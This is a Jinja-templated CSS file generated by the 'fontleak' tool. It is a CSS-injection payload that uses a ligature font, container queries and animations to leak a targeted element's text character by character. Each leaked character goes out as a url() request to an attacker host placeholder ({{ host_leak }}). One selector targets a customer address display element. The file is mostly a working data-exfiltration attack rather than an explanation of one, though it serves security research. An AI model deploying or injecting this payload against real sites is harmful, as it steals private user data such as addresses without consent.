/*
    This file was dynamically generated by fontleak (https://github.com/adrgs/fontleak)
*/
html:has({{ leak_selector }}) *, html:has({{ leak_selector }}) {
    all: initial !important;
    display: none !important;
}

html:has({{ leak_selector }}), html:has({{ leak_selector }}) body:not(#test), html:has({{ leak_selector }}) head:not(#test) {
    padding: 0!important;
    margin: 0!important;
    width: 0!important;
    height: 0!important;
    border: 0!important;
    outline: 0!important;
    line-height: 0!important;
    position: relative !important;
}

html:has({{ leak_selector }}) {
    top: 0 !important;
    left: 0 !important;
    display: grid !important;
    grid-template-columns: 1fr auto !important;
    width: {{ html_width }}px !important;
    will-change: content, transform !important;
}

html:has({{ leak_selector }}) head:not(#test) {
    display: block !important;
    container-type: size !important;
    container-name: leak !important;
    height: 100% !important;
    width: 100% !important;
    max-width: {{ html_width }}px !important;
    background: blue !important;
    animation: indexCycle {{ idx_max * 0.05 }}s steps(1) infinite 1s !important;
    {% for container in width_containers %}
    --i{{ container.width }}: '';
    {% endfor %}
}

/* Set up the head::before for reporting */
html:has({{ leak_selector }}) head:not(#test)::before {
    display: block !important;
    width: 0px !important;
    height: 0px !important;
    position: absolute !important;
    top: 0 !important;
    left: 0 !important;
    content: '';
}

html:has({{ leak_selector }}) body:not(#test), html:has({{ leak_selector }}) *:not(#test):has({{ leak_selector }}),[data-testid=addressdisplay-customer-primary-text]:not(#test) {
    display: block !important;
    width: auto !important;
    height: auto !important;
    position: static !important;
}

@font-face {
    font-family: 'fontleak';
    src: url('{{ font_path }}') format('opentype');
}

/* Target element styling */
{{ leak_selector }}:not(#test) {
    display: inline-block !important;
    font-family: 'fontleak' !important;
    font-size: 1000px !important;
    width: fit-content !important;
    overflow: hidden !important;
    white-space: normal !important;
    word-spacing: -1ch !important;
    letter-spacing: 0 !important;
    line-height: 3px !important;
    font-feature-settings: 'rlig' on, 'liga' on, 'calt' on, 'dlig' on !important;
    text-rendering: optimizeLegibility !important;
    -webkit-font-feature-settings: 'rlig', 'liga', 'calt', 'dlig' !important;
    font-variant-ligatures: discretionary-ligatures !important;
    background: skyblue !important;
    will-change: content, transform !important;
    position: relative !important;
}

{{ leak_selector }}:not(#test)::before {
    margin: 0 !important;
    padding: 0 !important;
    font-family: 'fontleak' !important;
    font-size: 1000px !important;
    white-space: pre-line !important;
    content: '{{ step_char }}';
    animation: fontCycle {{ idx_max * 0.05 }}s steps(1) infinite 1s !important;
}

@keyframes fontCycle {
    {% for i in range(idx_max) %}
    {{ (i / idx_max) * 100 }}% {
        content: '{{ step_chars[i] }}';
    }
    {% endfor %}
}

@keyframes indexCycle {
    {% for i in range(idx_max) %}
    {{ (i / idx_max) * 100 }}% {
        {% for container in width_containers %}
            --i{{ container.width }}: url({{ host_leak }}/{{ container.char_idx }}/{{ i }}/{{ id }});
        {% endfor %}
    }
    {% endfor %}
}

{% for container in width_containers %}
@container leak (width: {{ container.width }}px) {
    html:has({{ leak_selector }}) head:not(#test)::before {
        content: var(--i{{ container.width }});
    }
}
{% endfor %}
